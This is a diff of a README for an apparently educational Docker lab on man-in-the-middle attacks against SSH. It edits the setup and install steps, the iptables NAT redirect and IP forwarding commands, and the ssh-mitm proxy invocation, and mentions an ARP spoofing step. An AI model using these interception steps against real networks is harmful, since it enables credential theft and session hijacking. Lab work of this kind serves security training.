@@ -32,7 +32,7 @@ This lab demonstrates how to perform a Man-in-the-Middle (MITM) attack on SSH co
 Clone the repository:
 
 ```shell
-git clone http://www.github.com/rootandbeer/ssh-mitm
+git clone http://www.github.com/rootandbeer/ssh-mitm-lab
 cd ssh-mitm
 ```
 
@@ -40,15 +40,25 @@ cd ssh-mitm
 Start the target environment:
 
 ```shell
-docker-compose up -d
+sudo docker compose up -d
 # Wait for services to initialize
 ```
 
----
+\
+Create and Launch Python VENV:
 
-## Network Configuration
+```shell
+python3 -m venv ~/.venv/ssh-mitm
+source ~/.venv/ssh-mitm/bin/activate
+```
 
->[!warning] Most networks will use `eth0` (use `ifconfig` to verify in real world applications), however since this lab is done in Docker, we have to find the specific Docker bridge interface.
+\
+Install `ssh-mitm`
+```shell
+python3 -m pip install "ssh-mitm[production]"
+```
+
+### Network Configuration
 
 Identify the Docker bridge interface:
 
@@ -59,9 +69,9 @@ export BRIDGE="br-$(sudo docker network ls | awk '/mitm_network/ {print $1}')"
 echo "Bridge: $BRIDGE"
 ```
 
----
+>[!warning] Most networks will use `eth0` (use `ifconfig` to verify in real world applications), however since this lab is done in Docker, we have to find the specific Docker bridge interface.
 
-## Configure IP Forwards & NAT Redirects
+### Configure IP Forwards & NAT Redirects
 
 Enable IP forwarding:
 
@@ -90,27 +100,21 @@ Verify the iptables rule was added:
 sudo iptables -t nat -L PREROUTING -n -v
 ```
 
+---
+
 ## Attack Execution
 
->[!danger] This attack simulation uses 3 terminals
+**This attack simulation uses 3 terminals**
 
 >[!note] Terminal 1 - Start the SSH MITM proxy
 >
 >Basic configuration:
 >
 >```shell
->sudo ssh-mitm server \
+>ssh-mitm server \
 >    --remote-host 172.25.0.10 \
 >    --listen-port 22 \
 >    --listen-address 172.25.0.1
->```
->
->\
->Verify ssh-mitm is listening:
->
->```shell
->sudo netstat -tlnp | grep :22
-># Should show ssh-mitm listening on 172.25.0.1:22
 >```
 
 >[!important] Terminal 2 - Start ARP spoofing:
@@ -127,7 +131,7 @@ sudo iptables -t nat -L PREROUTING -n -v
 >Access the victim container:
 >
 >```shell
->docker exec -it victim-client bash
+>sudo docker exec -it victim-client bash
 >```
 >
 >\
@@ -222,10 +226,10 @@ sudo sysctl -w net.ipv4.ip_forward=0
 Stop and remove the Docker containers:
 
 ```shell
-docker-compose down
+sudo docker compose down
 ```
 
 ---
 
 \
-⭐ Please give a [Star](http://www.github.com/rootandbeer/ssh-mitm) if you enjoyed this lab ⭐
+⭐ Please give a [Star](http://www.github.com/rootandbeer/ssh-mitm-lab) if you enjoyed this lab ⭐
